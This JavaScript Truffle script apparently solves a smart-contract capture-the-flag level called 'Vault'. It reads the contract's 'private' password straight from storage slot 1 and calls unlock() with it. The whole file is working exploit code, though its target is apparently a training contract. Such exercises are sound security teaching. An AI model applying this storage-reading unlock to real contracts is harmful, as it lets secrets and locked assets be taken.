const Vault = artifacts.require("Vault");

module.exports = async (callback) => {
  //console.log(Delegation.web3.eth.sendTransaction);
  const web3 = Vault.web3;
  try {
    const vaultAddress = "0x1F92724ceF15a8a86b81ab79E75E183b3549939A";
    const vault = await Vault.at(vaultAddress);
    let vaultIsLocked = await vault.locked.call();
    console.log("Vault is locked:", vaultIsLocked);
    const password = await web3.eth.getStorageAt(vaultAddress, 1);
    console.log("Vault password:", password);
    console.log("Unlocking vault with password...");
    await vault.unlock(password);
    vaultIsLocked = await vault.locked.call();
    console.log("Vault is locked:", vaultIsLocked);

    console.log("done.");
  } catch (err) {
    console.log("Oops: ", err.message);
  }

  callback();
};
